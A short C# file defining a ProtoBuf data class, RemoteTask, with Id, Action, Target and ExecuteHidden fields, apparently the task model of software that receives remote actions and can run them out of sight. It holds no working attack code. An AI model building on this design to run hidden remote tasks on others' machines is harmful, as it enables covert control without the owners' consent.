using ProtoBuf;
using System.ComponentModel;

namespace NoiseMe.Drags.App.Models.Common
{
	[ProtoContract(Name = "RemoteTask")]
	public class RemoteTask : INotifyPropertyChanged
	{
		[ProtoMember(1, Name = "Id")]
		public int Id
		{
			get;
			set;
		}

		[ProtoMember(2, Name = "Action")]
		public string Action
		{
			get;
			set;
		}

		[ProtoMember(3, Name = "Target")]
		public string Target
		{
			get;
			set;
		}

		[ProtoMember(4, Name = "ExecuteHidden")]
		public bool ExecuteHidden
		{
			get;
			set;
		}

		public event PropertyChangedEventHandler PropertyChanged;
	}
}
